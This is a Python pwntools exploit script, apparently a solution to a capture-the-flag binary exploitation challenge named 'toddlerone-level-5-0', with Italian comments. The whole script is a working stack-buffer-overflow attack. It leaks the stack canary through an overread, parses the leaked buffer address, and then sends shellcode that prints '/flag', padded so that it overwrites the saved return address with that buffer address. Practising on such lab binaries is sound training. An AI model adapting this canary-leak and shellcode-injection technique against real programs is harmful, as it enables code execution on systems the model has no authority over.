#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'

elf = ELF('/challenge/toddlerone-level-5-0')

io = elf.process()

PAYLOAD = b'REPEAT' + (b'A' * 98) + b'\x44\x5d\x8a\x97\xcb\x80\xb8\x23' + b'A' * 6 + b"XYZ" 
io.sendline(f"{len(PAYLOAD)}".encode())
io.sendline(PAYLOAD)
io.recvuntil(b'XYZ')
cana = u64(io.recv(7).rjust(8, b'\x00'))  # Legge 7 byte e li converte in un valore a 64 bit
cana = p64(cana)  # Converte il canary in formato p64 (8 byte)
print(cana)



io.recvuntil(b"The input buffer begins at 0x")

buff_addr = p64(int(io.recvuntil(b',').decode()[:-1],16))
print(buff_addr)

SHELLCODE = asm(shellcraft.cat('/flag'))
print(len(SHELLCODE))

payload = SHELLCODE + b'A' * (104-len(SHELLCODE)) + b'\x44\x5d\x8a\x97\xcb\x80\xb8\x23' + (b'A' * 8) + cana + b'A' * 24 + buff_addr

io.sendline(f"{len(payload)}".encode())
io.sendline(payload)
io.interactive()
